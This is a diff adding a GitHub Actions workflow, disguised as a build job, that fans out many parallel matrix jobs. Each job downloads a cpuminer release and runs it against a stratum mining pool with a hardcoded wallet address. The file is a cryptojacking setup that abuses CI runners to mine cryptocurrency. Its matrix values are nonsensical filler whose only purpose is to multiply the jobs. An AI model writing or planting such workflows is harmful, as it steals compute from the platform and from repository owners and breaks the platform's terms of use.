@@ -1,0 +1,26 @@
+me: mbtc1
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    name: mbtcx
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+    - name: Extract
+      run: tar xf cpuminer-opt-linux.tar.gz
+    - name: RUNNING
+      run: ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:17022 -u BYN4C5yiCRjoTVXt8f5k5dgpXvRBAtVESC.mbc -t4 -p x
+    - name: DONE
+      run: exit
